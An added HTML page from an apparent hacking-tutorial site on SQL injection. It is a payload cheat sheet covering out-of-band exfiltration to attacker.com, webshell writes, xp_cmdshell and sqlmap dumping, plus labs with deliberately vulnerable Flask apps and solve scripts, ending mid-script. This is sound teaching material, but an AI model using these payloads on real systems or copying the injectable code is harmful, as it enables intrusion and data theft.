@@ -1,0 +1,1894 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+        (function() {
+        const base = document.createElement('base');
+        if(location.hostname.includes('github.io')){
+          base.href = `/HackBook/`;
+        }else{
+          const pathSegments = window.location.pathname.split('/').filter(element => element !== "");
+          const index = pathSegments.indexOf('HackBook');
+          pathSegments.splice(index + 1, pathSegments.length - (index + 1));
+          base.href = pathSegments.join('/') + '/';
+        }
+        document.head.appendChild(base);
+      })();
+    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="icon" type="image/x-icon" href="assets/images/hacker.jpg">
+  <title>HackBook | SQL Injection</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-sql.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
+  <link rel="stylesheet" href="https://unpkg.com/prism-themes@1.6.0/themes/prism-duotone-sea.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <script src="assets/scripts/main.js"></script>
+  <link rel="stylesheet" href="assets/styles/styles.css">
+</head>
+<body>
+  <div class="content">
+    <h1>SQL Injection</h1>
+    <hr>
+
+    <div class="tab-container">
+      <div class="tab-buttons">
+        <button class="tab-btn active" data-tab="notes">Notes</button>
+        <button class="tab-btn" data-tab="lab">Lab</button>
+        <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+      </div>
+
+      <!-- NOTES TAB -->
+      <div class="tab-content active" id="notes">
+
+        <!-- ==================== SQLI TYPES ==================== -->
+        <h2>Types of SQL Injection</h2>
+
+        <h3>In-Band (Classic)</h3>
+        <p>Results are returned directly in the application response. Easiest to exploit.</p>
+
+        <h4>Error-Based</h4>
+        <p>Force the database to throw errors that leak data in the error message.</p>
+<pre><code class="language-sql">-- MySQL: extractvalue / updatexml
+' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) -- -
+' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1) -- -
+
+-- PostgreSQL: cast error
+' AND 1=CAST((SELECT version()) AS int) -- -
+
+-- MSSQL: convert error
+' AND 1=CONVERT(int, (SELECT @@version)) -- -</code></pre>
+
+        <h4>UNION-Based</h4>
+        <p>Append a <code>UNION SELECT</code> to extract data through the normal query result set.</p>
+<pre><code class="language-sql">-- Step 1: Find column count with ORDER BY
+' ORDER BY 1 -- -    (OK)
+' ORDER BY 2 -- -    (OK)
+' ORDER BY 3 -- -    (OK)
+' ORDER BY 4 -- -    (ERROR → 3 columns)
+
+-- Step 2: Find which columns are displayed
+' UNION SELECT NULL, NULL, NULL -- -
+' UNION SELECT 'a', NULL, NULL -- -
+' UNION SELECT NULL, 'a', NULL -- -
+' UNION SELECT NULL, NULL, 'a' -- -
+
+-- Step 3: Extract data through visible columns
+' UNION SELECT NULL, username, password FROM users -- -</code></pre>
+
+        <h3>Blind SQL Injection</h3>
+        <p>No data is returned directly. You infer information from the application's behavior.</p>
+
+        <h4>Boolean-Based Blind</h4>
+        <p>Application returns different responses for TRUE vs FALSE conditions.</p>
+<pre><code class="language-sql">-- Test: does the response change?
+' AND 1=1 -- -    (normal response → TRUE)
+' AND 1=2 -- -    (different response → FALSE)
+
+-- Extract data character by character
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' -- -
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b' -- -
+
+-- Binary search with ASCII values (faster)
+' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 77 -- -
+' AND ASCII(SUBSTRING((SELECT username FROM users LIMIT 1),1,1)) > 100 -- -</code></pre>
+
+        <h4>Time-Based Blind</h4>
+        <p>No visible difference in response. Use time delays to infer TRUE/FALSE.</p>
+<pre><code class="language-sql">-- MySQL
+' AND IF(1=1, SLEEP(5), 0) -- -
+' AND IF((SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a', SLEEP(5), 0) -- -
+
+-- PostgreSQL
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -
+
+-- MSSQL
+'; IF (1=1) WAITFOR DELAY '0:0:5' -- -
+
+-- SQLite
+' AND CASE WHEN (1=1) THEN randomblob(500000000) ELSE 0 END -- -</code></pre>
+
+        <h3>Out-of-Band (OOB)</h3>
+        <p>Exfiltrate data via DNS or HTTP requests from the database server. Works when in-band and blind are not feasible.</p>
+<pre><code class="language-sql">-- MySQL (requires FILE privilege + secure_file_priv not set)
+SELECT LOAD_FILE(concat('\\\\', (SELECT version()), '.attacker.com\\a'));
+
+-- MSSQL (xp_dirtree)
+EXEC master..xp_dirtree '\\' + (SELECT TOP 1 username FROM users) + '.attacker.com\a'
+
+-- Oracle (UTL_HTTP)
+SELECT UTL_HTTP.REQUEST('http://attacker.com/' || (SELECT user FROM dual)) FROM dual;</code></pre>
+
+        <!-- ==================== DETECTION ==================== -->
+        <h2>Detection &amp; Testing</h2>
+
+        <h3>Quick Tests</h3>
+<pre><code class="language-sql">-- String-based parameter
+'
+''
+' OR '1'='1
+' OR '1'='1' -- -
+' OR '1'='1' /*
+
+-- Numeric parameter
+1 OR 1=1
+1 OR 1=1 -- -
+1 AND 1=2
+
+-- Time-based detection
+' OR SLEEP(5) -- -
+'; WAITFOR DELAY '0:0:5' -- -
+
+-- Error provocation
+' AND 1=CONVERT(int, @@version) -- -
+' AND extractvalue(1, concat(0x7e, version())) -- -</code></pre>
+
+        <h3>Comment Syntax by Database</h3>
+        <table>
+          <tr><th>Database</th><th>Line Comment</th><th>Block Comment</th><th>Inline Comment</th></tr>
+          <tr><td>MySQL</td><td><code>-- -</code> or <code>#</code></td><td><code>/* ... */</code></td><td><code>/*!50000 ... */</code></td></tr>
+          <tr><td>PostgreSQL</td><td><code>--</code></td><td><code>/* ... */</code></td><td>N/A</td></tr>
+          <tr><td>MSSQL</td><td><code>--</code></td><td><code>/* ... */</code></td><td>N/A</td></tr>
+          <tr><td>SQLite</td><td><code>--</code></td><td><code>/* ... */</code></td><td>N/A</td></tr>
+          <tr><td>Oracle</td><td><code>--</code></td><td><code>/* ... */</code></td><td>N/A</td></tr>
+        </table>
+
+        <!-- ==================== UNION INJECTION ==================== -->
+        <h2>UNION-Based Injection (Full Walkthrough)</h2>
+
+        <h3>Step 1: Determine Column Count</h3>
+<pre><code class="language-sql">-- ORDER BY method (increment until error)
+' ORDER BY 1 -- -
+' ORDER BY 2 -- -
+' ORDER BY 5 -- -   → error means < 5 columns
+' ORDER BY 4 -- -   → works → 4 columns
+
+-- UNION NULL method
+' UNION SELECT NULL -- -
+' UNION SELECT NULL, NULL -- -
+' UNION SELECT NULL, NULL, NULL -- -   → works → 3 columns</code></pre>
+
+        <h3>Step 2: Find Displayed Columns</h3>
+<pre><code class="language-sql">-- Replace NULLs one at a time with strings
+' UNION SELECT 'test1', NULL, NULL -- -
+' UNION SELECT NULL, 'test2', NULL -- -
+' UNION SELECT NULL, NULL, 'test3' -- -
+-- Whichever value appears on the page is the injectable column</code></pre>
+
+        <h3>Step 3: Extract Data</h3>
+<pre><code class="language-sql">-- Database version
+' UNION SELECT NULL, version(), NULL -- -
+
+-- Current user
+' UNION SELECT NULL, user(), NULL -- -       -- MySQL
+' UNION SELECT NULL, current_user, NULL -- -  -- PostgreSQL
+
+-- Current database
+' UNION SELECT NULL, database(), NULL -- -            -- MySQL
+' UNION SELECT NULL, current_database(), NULL -- -    -- PostgreSQL</code></pre>
+
+        <!-- ==================== DATABASE ENUMERATION ==================== -->
+        <h2>Database Enumeration</h2>
+
+        <h3>MySQL (information_schema)</h3>
+<pre><code class="language-sql">-- List all databases
+' UNION SELECT NULL, schema_name, NULL FROM information_schema.schemata -- -
+
+-- List tables in a database
+' UNION SELECT NULL, table_name, NULL FROM information_schema.tables
+  WHERE table_schema = 'target_db' -- -
+
+-- List columns in a table
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns
+  WHERE table_name = 'users' AND table_schema = 'target_db' -- -
+
+-- Extract data
+' UNION SELECT NULL, concat(username, ':', password), NULL FROM target_db.users -- -
+
+-- Concat multiple rows with GROUP_CONCAT
+' UNION SELECT NULL, GROUP_CONCAT(username, 0x3a, password SEPARATOR 0x0a), NULL
+  FROM users -- -</code></pre>
+
+        <h3>PostgreSQL (pg_catalog)</h3>
+<pre><code class="language-sql">-- List databases
+' UNION SELECT NULL, datname, NULL FROM pg_database -- -
+
+-- List tables
+' UNION SELECT NULL, tablename, NULL FROM pg_tables
+  WHERE schemaname = 'public' -- -
+
+-- List columns
+' UNION SELECT NULL, column_name, NULL FROM information_schema.columns
+  WHERE table_name = 'users' -- -
+
+-- Extract data
+' UNION SELECT NULL, username || ':' || password, NULL FROM users -- -
+
+-- String aggregation
+' UNION SELECT NULL, string_agg(username || ':' || password, E'\n'), NULL
+  FROM users -- -</code></pre>
+
+        <h3>SQLite (sqlite_master)</h3>
+<pre><code class="language-sql">-- List all tables
+' UNION SELECT NULL, name, NULL FROM sqlite_master
+  WHERE type = 'table' -- -
+
+-- Get table schema (CREATE TABLE statement)
+' UNION SELECT NULL, sql, NULL FROM sqlite_master
+  WHERE type = 'table' AND name = 'users' -- -
+
+-- Extract data
+' UNION SELECT NULL, username || ':' || password, NULL FROM users -- -
+
+-- Group concat
+' UNION SELECT NULL, GROUP_CONCAT(username || ':' || password, char(10)), NULL
+  FROM users -- -</code></pre>
+
+        <h3>MSSQL (sys tables)</h3>
+<pre><code class="language-sql">-- List databases
+' UNION SELECT NULL, name, NULL FROM master..sysdatabases -- -
+
+-- List tables
+' UNION SELECT NULL, name, NULL FROM sysobjects WHERE xtype = 'U' -- -
+
+-- List columns
+' UNION SELECT NULL, name, NULL FROM syscolumns
+  WHERE id = (SELECT id FROM sysobjects WHERE name = 'users') -- -
+
+-- Extract data
+' UNION SELECT NULL, username + ':' + password, NULL FROM users -- -</code></pre>
+
+        <!-- ==================== AUTH BYPASS ==================== -->
+        <h2>Authentication Bypass</h2>
+<pre><code class="language-sql">-- Classic login bypass (username field)
+' OR 1=1 -- -
+' OR '1'='1' -- -
+admin' -- -
+admin' #
+' OR 1=1 LIMIT 1 -- -
+
+-- Password field bypass
+' OR '1'='1
+' OR 1=1 -- -
+
+-- Common payloads
+' OR ''='
+' OR 1 -- -
+'='
+' LIKE '%
+') OR ('1'='1
+') OR ('1'='1' -- -
+
+-- Login as specific user
+admin' -- -
+admin'/*</code></pre>
+        <p><strong>Example vulnerable query:</strong></p>
+<pre><code class="language-sql">-- Backend query:
+SELECT * FROM users WHERE username = '$user' AND password = '$pass'
+
+-- With payload admin' -- - in username field becomes:
+SELECT * FROM users WHERE username = 'admin' -- -' AND password = 'anything'
+-- The password check is commented out</code></pre>
+
+        <!-- ==================== WAF BYPASS ==================== -->
+        <h2>WAF Bypass Techniques</h2>
+
+        <h3>Comment Obfuscation</h3>
+<pre><code class="language-sql">-- Inline comments to break keyword detection
+UN/**/ION SEL/**/ECT 1,2,3 -- -
+/*!50000UNION*/ /*!50000SELECT*/ 1,2,3 -- -
+
+-- Nested comments (MySQL versioned)
+/*!UNION*/ /*!SELECT*/ 1,2,3</code></pre>
+
+        <h3>Case Mixing</h3>
+<pre><code class="language-sql">UnIoN SeLeCt 1,2,3 -- -
+uNiOn aLl sElEcT 1,2,3 -- -</code></pre>
+
+        <h3>URL / Double Encoding</h3>
+<pre><code class="language-bash"># URL encode the payload
+%27%20UNION%20SELECT%201,2,3%20--%20-
+
+# Double URL encode
+%2527%2520UNION%2520SELECT%25201,2,3
+
+# Hex encoding in MySQL
+' UNION SELECT 0x61646d696e, 0x70617373776f7264 -- -</code></pre>
+
+        <h3>Whitespace Alternatives</h3>
+<pre><code class="language-sql">-- Use tabs, newlines, or comments instead of spaces
+'%09UNION%09SELECT%091,2,3 -- -
+'%0aUNION%0aSELECT%0a1,2,3 -- -
+'/**/UNION/**/SELECT/**/1,2,3 -- -
+
+-- Parentheses to avoid spaces
+'UNION(SELECT(1),(2),(3)) -- -</code></pre>
+
+        <h3>Keyword Alternatives</h3>
+<pre><code class="language-sql">-- UNION alternatives
+' UNION ALL SELECT 1,2,3 -- -
+' UNION DISTINCT SELECT 1,2,3 -- -
+
+-- OR / AND with math
+' || 1=1 -- -      -- PostgreSQL, SQLite
+' && 1=1 -- -      -- MySQL
+
+-- String concat without CONCAT
+-- MySQL:   'ad' 'min' (adjacent strings) or 0x61646d696e
+-- MSSQL:   'ad' + 'min'
+-- Pg/SQLite: 'ad' || 'min'</code></pre>
+
+        <!-- ==================== SQLMAP ==================== -->
+        <h2>sqlmap</h2>
+
+        <h3>Basic Usage</h3>
+<pre><code class="language-bash"># Test a GET parameter
+sqlmap -u "http://target.com/page?id=1" --batch
+
+# Test a POST form
+sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch
+
+# Specify the injectable parameter
+sqlmap -u "http://target.com/page?id=1&cat=2" -p id --batch</code></pre>
+
+        <h3>Enumeration</h3>
+<pre><code class="language-bash"># Get current database
+sqlmap -u "http://target.com/page?id=1" --current-db
+
+# List all databases
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# List tables in a database
+sqlmap -u "http://target.com/page?id=1" -D target_db --tables
+
+# List columns in a table
+sqlmap -u "http://target.com/page?id=1" -D target_db -T users --columns
+
+# Dump table data
+sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump
+
+# Dump specific columns
+sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump</code></pre>
+
+        <h3>Authentication &amp; Cookies</h3>
+<pre><code class="language-bash"># With cookies (authenticated testing)
+sqlmap -u "http://target.com/page?id=1" --cookie="PHPSESSID=abc123; token=xyz"
+
+# With custom headers
+sqlmap -u "http://target.com/page?id=1" --headers="Authorization: Bearer TOKEN\nX-Custom: value"
+
+# From a Burp Suite request file
+sqlmap -r request.txt --batch</code></pre>
+
+        <h3>Tamper Scripts</h3>
+<pre><code class="language-bash"># List available tamper scripts
+sqlmap --list-tampers
+
+# Use tamper scripts for WAF bypass
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment --batch
+sqlmap -u "http://target.com/page?id=1" --tamper=between,randomcase --batch
+sqlmap -u "http://target.com/page?id=1" --tamper=charencode --batch
+
+# Common tamper scripts:
+# space2comment   →  replaces spaces with /**/
+# between         →  replaces > with NOT BETWEEN 0 AND
+# randomcase      →  random case for keywords
+# charencode      →  URL-encodes all characters
+# equaltolike     →  replaces = with LIKE
+# base64encode    →  base64 encodes payload</code></pre>
+
+        <h3>OS Shell &amp; File Access</h3>
+<pre><code class="language-bash"># Get an OS shell (requires stacked queries + privileges)
+sqlmap -u "http://target.com/page?id=1" --os-shell
+
+# Read a file from the server
+sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"
+
+# Write a file (webshell)
+sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+
+# SQL shell (interactive SQL console)
+sqlmap -u "http://target.com/page?id=1" --sql-shell</code></pre>
+
+        <!-- ==================== SECOND ORDER ==================== -->
+        <h2>Second-Order SQL Injection</h2>
+        <p>Payload is stored first (e.g., in a registration form), then triggered later when the stored value is used in a different query without sanitization.</p>
+<pre><code class="language-sql">-- Step 1: Register with a malicious username
+Username: admin' -- -
+Password: anything
+
+-- Step 2: Password reset uses stored username unsafely
+-- Backend query on password change:
+UPDATE users SET password = 'newpass' WHERE username = 'admin' -- -'
+-- This resets the admin password instead of the attacker's account</code></pre>
+
+        <!-- ==================== STACKED QUERIES ==================== -->
+        <h2>Stacked Queries</h2>
+        <p>Execute multiple SQL statements in one injection. Supported by MSSQL and PostgreSQL; MySQL only via specific APIs (e.g., <code>mysqli_multi_query</code>).</p>
+<pre><code class="language-sql">-- Insert a new admin user
+'; INSERT INTO users (username, password, role) VALUES ('hacker', 'pass123', 'admin') -- -
+
+-- Drop a table (destructive)
+'; DROP TABLE logs -- -
+
+-- Update another user's password
+'; UPDATE users SET password = 'hacked' WHERE username = 'admin' -- -
+
+-- Time-based via stacked query (MSSQL)
+'; WAITFOR DELAY '0:0:5' -- -</code></pre>
+
+        <!-- ==================== FILE READ/WRITE ==================== -->
+        <h2>Reading &amp; Writing Files via SQLi</h2>
+
+        <h3>MySQL</h3>
+<pre><code class="language-sql">-- Read files (requires FILE privilege)
+' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL -- -
+' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php'), NULL -- -
+
+-- Write files (requires FILE privilege + writable dir)
+' UNION SELECT NULL, '&lt;?php system($_GET["cmd"]); ?&gt;', NULL
+  INTO OUTFILE '/var/www/html/shell.php' -- -
+
+-- Check secure_file_priv (empty = no restriction)
+' UNION SELECT NULL, @@secure_file_priv, NULL -- -</code></pre>
+
+        <h3>PostgreSQL</h3>
+<pre><code class="language-sql">-- Read files (superuser required)
+'; CREATE TABLE tmp(data text);
+  COPY tmp FROM '/etc/passwd';
+  SELECT * FROM tmp; -- -
+
+-- Write files
+'; COPY (SELECT '&lt;?php system($_GET["cmd"]); ?&gt;') TO '/var/www/html/shell.php' -- -
+
+-- Command execution via COPY PROGRAM (PostgreSQL 9.3+)
+'; COPY cmd_output FROM PROGRAM 'id' -- -</code></pre>
+
+        <h3>MSSQL</h3>
+<pre><code class="language-sql">-- Read files via OPENROWSET
+SELECT * FROM OPENROWSET(BULK 'C:\windows\win.ini', SINGLE_CLOB) AS x;
+
+-- Enable xp_cmdshell and execute commands
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+EXEC xp_cmdshell 'whoami';</code></pre>
+
+        <!-- ==================== NOSQL ==================== -->
+        <h2>NoSQL Injection (MongoDB)</h2>
+<pre><code class="language-bash"># Login bypass — JSON body
+POST /login
+Content-Type: application/json
+
+{"username": {"$ne": ""}, "password": {"$ne": ""}}
+
+# Equivalent URL parameter injection
+/login?username[$ne]=&password[$ne]=
+
+# Extract data with $regex
+{"username": "admin", "password": {"$regex": "^a"}}
+{"username": "admin", "password": {"$regex": "^ab"}}
+{"username": "admin", "password": {"$regex": "^abc"}}</code></pre>
+
+<pre><code class="language-python"># Automated NoSQL boolean-based extraction
+import requests
+import string
+
+url = "http://target.com/login"
+password = ""
+chars = string.ascii_letters + string.digits + string.punctuation
+
+while True:
+    found = False
+    for c in chars:
+        payload = {
+            "username": "admin",
+            "password": {"$regex": f"^{password}{c}"}
+        }
+        r = requests.post(url, json=payload)
+        if "Welcome" in r.text:
+            password += c
+            print(f"[+] Found: {password}")
+            found = True
+            break
+    if not found:
+        break
+
+print(f"[+] Password: {password}")</code></pre>
+
+        <!-- ==================== DB SYNTAX DIFFERENCES ==================== -->
+        <h2>Database-Specific Syntax Differences</h2>
+        <table>
+          <tr><th>Feature</th><th>MySQL</th><th>PostgreSQL</th><th>SQLite</th><th>MSSQL</th></tr>
+          <tr>
+            <td>String concat</td>
+            <td><code>CONCAT(a,b)</code></td>
+            <td><code>a || b</code></td>
+            <td><code>a || b</code></td>
+            <td><code>a + b</code></td>
+          </tr>
+          <tr>
+            <td>Version</td>
+            <td><code>version()</code></td>
+            <td><code>version()</code></td>
+            <td><code>sqlite_version()</code></td>
+            <td><code>@@version</code></td>
+          </tr>
+          <tr>
+            <td>Current user</td>
+            <td><code>user()</code></td>
+            <td><code>current_user</code></td>
+            <td>N/A</td>
+            <td><code>SYSTEM_USER</code></td>
+          </tr>
+          <tr>
+            <td>Current DB</td>
+            <td><code>database()</code></td>
+            <td><code>current_database()</code></td>
+            <td>N/A</td>
+            <td><code>DB_NAME()</code></td>
+          </tr>
+          <tr>
+            <td>Substring</td>
+            <td><code>SUBSTRING(s,p,l)</code></td>
+            <td><code>SUBSTRING(s,p,l)</code></td>
+            <td><code>SUBSTR(s,p,l)</code></td>
+            <td><code>SUBSTRING(s,p,l)</code></td>
+          </tr>
+          <tr>
+            <td>If/Conditional</td>
+            <td><code>IF(cond,t,f)</code></td>
+            <td><code>CASE WHEN ... THEN ... END</code></td>
+            <td><code>CASE WHEN ... THEN ... END</code></td>
+            <td><code>IIF(cond,t,f)</code></td>
+          </tr>
+          <tr>
+            <td>Time delay</td>
+            <td><code>SLEEP(n)</code></td>
+            <td><code>pg_sleep(n)</code></td>
+            <td><code>randomblob(n)</code></td>
+            <td><code>WAITFOR DELAY '0:0:n'</code></td>
+          </tr>
+          <tr>
+            <td>Stacked queries</td>
+            <td>Rare (API-dependent)</td>
+            <td>Yes</td>
+            <td>Yes</td>
+            <td>Yes</td>
+          </tr>
+          <tr>
+            <td>Table listing</td>
+            <td><code>information_schema.tables</code></td>
+            <td><code>pg_tables</code></td>
+            <td><code>sqlite_master</code></td>
+            <td><code>sysobjects</code></td>
+          </tr>
+          <tr>
+            <td>Limit syntax</td>
+            <td><code>LIMIT n</code></td>
+            <td><code>LIMIT n</code></td>
+            <td><code>LIMIT n</code></td>
+            <td><code>TOP n</code></td>
+          </tr>
+        </table>
+
+      </div>
+
+      <!-- LAB TAB -->
+      <div class="tab-content" id="lab">
+        <h2>Labs</h2>
+
+        <div class="lab-card">
+          <h4>Lab 1: Login Bypass</h4>
+          <span class="difficulty difficulty-easy">Easy</span>
+          <p class="objective">Objective: Bypass the login form and authenticate as <code>admin</code> without knowing the password.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Vulnerable login
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('app.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 's3cretP@ss!')")
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (2, 'guest', 'guest123')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/login', methods=['GET', 'POST'])
+def login():
+    if request.method == 'POST':
+        user = request.form.get('username', '')
+        pw = request.form.get('password', '')
+        conn = sqlite3.connect('app.db')
+        c = conn.cursor()
+        query = f"SELECT * FROM users WHERE username = '{user}' AND password = '{pw}'"
+        c.execute(query)
+        result = c.fetchone()
+        conn.close()
+        if result:
+            return f'&lt;h1&gt;Welcome, {result[1]}!&lt;/h1&gt;'
+        return '&lt;h1&gt;Login failed.&lt;/h1&gt;'
+    return '''&lt;form method="POST"&gt;
+        &lt;input name="username" placeholder="Username"&gt;
+        &lt;input name="password" type="password" placeholder="Password"&gt;
+        &lt;button&gt;Login&lt;/button&gt;&lt;/form&gt;'''
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Run the app and try logging in with incorrect credentials</li>
+              <li>Inject <code>admin' -- -</code> as the username with any password</li>
+              <li>Try <code>' OR 1=1 -- -</code> — what user does it return?</li>
+              <li>Try <code>' OR 1=1 LIMIT 1 OFFSET 1 -- -</code> to access the second user</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 2: UNION-Based Data Extraction</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Use UNION-based injection to enumerate tables and extract all usernames and passwords from the database.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — UNION injection lab
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('shop.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price TEXT)')
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)')
+    c.execute("INSERT OR IGNORE INTO products (id, name, price) VALUES (1, 'Laptop', '$999')")
+    c.execute("INSERT OR IGNORE INTO products (id, name, price) VALUES (2, 'Phone', '$599')")
+    c.execute("INSERT OR IGNORE INTO products (id, name, price) VALUES (3, 'Tablet', '$399')")
+    c.execute("INSERT OR IGNORE INTO users (id, username, password, role) VALUES (1, 'admin', 'FL4G{un10n_m4st3r}', 'admin')")
+    c.execute("INSERT OR IGNORE INTO users (id, username, password, role) VALUES (2, 'john', 'password123', 'user')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/products')
+def products():
+    pid = request.args.get('id', '1')
+    conn = sqlite3.connect('shop.db')
+    c = conn.cursor()
+    query = f"SELECT name, price FROM products WHERE id = {pid}"
+    c.execute(query)
+    rows = c.fetchall()
+    conn.close()
+    html = '&lt;h1&gt;Products&lt;/h1&gt;'
+    for row in rows:
+        html += f'&lt;p&gt;{row[0]} — {row[1]}&lt;/p&gt;'
+    return html
+
+app.run(debug=True)</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Browse <code>/products?id=1</code> — observe two columns displayed</li>
+              <li>Confirm column count: <code>/products?id=1 ORDER BY 2</code> (OK) vs <code>ORDER BY 3</code> (error)</li>
+              <li>List tables: <code>/products?id=0 UNION SELECT name, sql FROM sqlite_master WHERE type='table'</code></li>
+              <li>Extract user data: <code>/products?id=0 UNION SELECT username, password FROM users</code></li>
+              <li>Get all users at once with <code>GROUP_CONCAT</code></li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 3: Blind Boolean-Based SQLi</h4>
+          <span class="difficulty difficulty-medium">Medium</span>
+          <p class="objective">Objective: Extract the admin password character by character using boolean-based blind injection.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Boolean blind SQLi
+from flask import Flask, request
+import sqlite3
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('blind.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)')
+    c.execute("INSERT OR IGNORE INTO users (id, username, password) VALUES (1, 'admin', 'FL4G{bl1nd_b00l}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+@app.route('/user')
+def user():
+    uid = request.args.get('id', '1')
+    conn = sqlite3.connect('blind.db')
+    c = conn.cursor()
+    query = f"SELECT username FROM users WHERE id = {uid}"
+    c.execute(query)
+    result = c.fetchone()
+    conn.close()
+    if result:
+        return '&lt;h1&gt;User exists&lt;/h1&gt;'
+    return '&lt;h1&gt;User not found&lt;/h1&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-python"># solve.py — Automated extraction
+import requests
+import string
+
+url = "http://127.0.0.1:5000/user"
+charset = string.printable
+password = ""
+
+for pos in range(1, 30):
+    found = False
+    for char in charset:
+        payload = f"1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),{pos},1)='{char}'"
+        r = requests.get(url, params={"id": payload})
+        if "User exists" in r.text:
+            password += char
+            print(f"[+] Position {pos}: {char}  →  {password}")
+            found = True
+            break
+    if not found:
+        break
+
+print(f"\n[+] Password: {password}")</code></pre>
+            <p><strong>Tasks:</strong></p>
+            <ol>
+              <li>Confirm injection: <code>/user?id=1 AND 1=1</code> (exists) vs <code>/user?id=1 AND 1=2</code> (not found)</li>
+              <li>Determine password length: <code>1 AND LENGTH((SELECT password FROM users LIMIT 1)) = 15</code></li>
+              <li>Extract the first character manually, then run the solve script</li>
+            </ol>
+          </div>
+        </div>
+
+        <div class="lab-card">
+          <h4>Lab 4: Time-Based Blind SQLi</h4>
+          <span class="difficulty difficulty-hard">Hard</span>
+          <p class="objective">Objective: Extract database contents using only time delays as an oracle — no visible output difference.</p>
+          <div class="setup-code">
+<pre><code class="language-python"># app.py — Time-based blind SQLi
+from flask import Flask, request
+import sqlite3, time
+
+app = Flask(__name__)
+
+def init_db():
+    conn = sqlite3.connect('timebased.db')
+    c = conn.cursor()
+    c.execute('CREATE TABLE IF NOT EXISTS secrets (id INTEGER PRIMARY KEY, flag TEXT)')
+    c.execute("INSERT OR IGNORE INTO secrets (id, flag) VALUES (1, 'FL4G{t1m3_1s_0n_my_s1d3}')")
+    conn.commit()
+    conn.close()
+
+init_db()
+
+# Custom SQLite function for sleep
+def sqlite_sleep(n):
+    time.sleep(n)
+    return 0
+
+@app.route('/check')
+def check():
+    uid = request.args.get('id', '1')
+    conn = sqlite3.connect('timebased.db')
+    conn.create_function('sleep', 1, sqlite_sleep)
+    c = conn.cursor()
+    query = f"SELECT id FROM secrets WHERE id = {uid}"
+    try:
+        c.execute(query)
+        c.fetchall()
+    except:
+        pass
+    conn.close()
+    return '&lt;h1&gt;OK&lt;/h1&gt;'
+
+app.run(debug=True)</code></pre>
+<pre><code class="language-python"># solve.py — Time-based extraction
+import requests
+import string
+import time
+
+url = "http://127.0.0.1:5000/check"
+charset = string.printable
+flag = ""
+
+for pos in range(1, 40):
+    found = False
+    for char in charset:
+        # Use CASE WHEN to trigger sleep on correct char
+        payload = (
+            f"1 AND (SELECT CASE WHEN "
+            f"SUBSTR((SELECT flag FROM secrets LIMIT 1),{pos},1)='{char}' "
+            f"THEN sleep(2) ELSE 0 END)"
+        )
+        start = time.time()
+        r = requests.get(url, params={"id": payload})
+        elapsed = time.time() - start
+        if elapsed >= 2:
+            flag += char
+            print(f"[+] Position {pos}: {char}  →  {flag}")
+            found = True
+            break
+    if not found:
